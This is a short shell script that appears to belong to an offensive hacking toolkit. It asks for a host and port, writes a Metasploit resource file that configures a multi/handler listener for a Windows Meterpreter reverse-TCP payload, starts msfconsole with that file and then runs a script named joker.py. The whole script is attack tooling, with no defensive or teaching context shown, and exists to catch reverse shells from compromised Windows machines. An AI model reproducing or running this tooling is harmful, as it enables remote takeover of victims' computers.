clear
echo -e "$cyan"
read -p "Enter Host~: " ip
read -p "Enter Port~: " port
cd msf
echo "use exploit/multi/handler" > .msfw.rc
echo "set payloads windows/meterpreter/reverse_tcp" >> .msfw.rc
echo "set lhost $ip" >> .msfw.rc
echo "set lport $port" >> .msfw.rc
echo "exploit" >> .msfw.rc
msfconsole -r .msfw.rc
python joker.py

